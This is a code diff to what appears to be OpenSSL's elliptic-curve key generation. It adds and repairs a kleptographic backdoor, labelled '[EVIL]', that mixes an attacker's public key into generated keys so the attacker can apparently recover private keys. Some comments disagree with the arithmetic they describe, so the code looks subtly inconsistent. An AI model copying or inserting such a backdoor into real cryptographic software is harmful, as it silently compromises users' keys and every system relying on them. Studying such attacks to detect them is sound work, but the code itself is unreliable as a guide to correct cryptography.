@@ -247,24 +247,9 @@ BIGNUM* _H(BIGNUM* x){
     SHA512_Update(&sha512, x->d, c2size);
     SHA512_Final(hash, &sha512);
 
-    hash[c2size + 1] = '\0'; // crop 64 bytes output to c2size bytes output
     BIGNUM* ret = BN_new();
-    BN_asc2bn(&ret, hash);
-
-//    ret->top = x->top;
-//    ret->flags = x->flags;
-//    ret->neg = x->neg;
-//    ret->dmax = x->dmax;
-//
-//    int s = sizeof(x->d[0]);
-//    int index = 0;
-//    for(int i=0; i<c2size; i+=s){
-//        BN_ULONG d = 0;
-//        for(int j=0; j<s; j++){
-//            d += hash[i+j] << (8 * j);
-//        }
-//        ret->d[index++] = d;
-//    }
+    // take first c2size bytes from hash
+    if(!BN_bin2bn(hash, c2size, ret)) _perror("[EVIL] _H(x)");
 
     return ret;
 }
@@ -347,12 +332,12 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
 
         // V = vG -- attacker's public key
         EC_POINT *V = EC_POINT_new(eckey->group);
-        //if(!EC_POINT_copy(V, G)) _perror("[EVIL] V=G");
+        if(!EC_POINT_copy(V, G)) _perror("[EVIL] V=G");
         EC_POINT_mul(eckey->group, V, v, NULL, NULL, ctx);
         
         {
             // Q1 = c1 * G
-            //if(!EC_POINT_copy(Q2, G)) _perror("[EVIL] Q2=G");
+            if(!EC_POINT_copy(Q2, G)) _perror("[EVIL] Q2=G");
             EC_POINT_mul(eckey->group, Q2, priv_key, NULL, NULL, ctx);
             // Q2 = a * Q1
             EC_POINT_mul(eckey->group, Q2, params[0], NULL, NULL, ctx);
@@ -361,7 +346,7 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
 
         {
             // W1 = c1 * V
-            //if(!EC_POINT_copy(W2, V)) _perror("[EVIL] W2=V");
+            if(!EC_POINT_copy(W2, V)) _perror("[EVIL] W2=V");
             EC_POINT_mul(eckey->group, W2, priv_key, NULL, NULL, ctx);
             // W2 = b * W1
             EC_POINT_mul(eckey->group, W2, params[1], NULL, NULL, ctx);
@@ -372,7 +357,7 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
 
         if(j == 1){
             // E2 = h * G
-            //if(!EC_POINT_copy(E2, G)) _perror("[EVIL] E2=V");
+            if(!EC_POINT_copy(E2, G)) _perror("[EVIL] E2=V");
             EC_POINT_mul(eckey->group, E2, params[2], NULL, NULL, ctx);
             // Z += E2
             if(!EC_POINT_add(eckey->group, Z, Z, E2, ctx)) _perror("[EVIL] Z=Z+E2");
@@ -381,7 +366,7 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
 
         if(u == 1){
             // R2 = e * V
-            //if(!EC_POINT_copy(R2, V)) _perror("[EVIL] R2=V");
+            if(!EC_POINT_copy(R2, V)) _perror("[EVIL] R2=V");
             EC_POINT_mul(eckey->group, R2, params[3], NULL, NULL, ctx);
             // Z += R2
             if(!EC_POINT_add(eckey->group, Z, Z, R2, ctx)) _perror("[EVIL] Z=Z+R2");
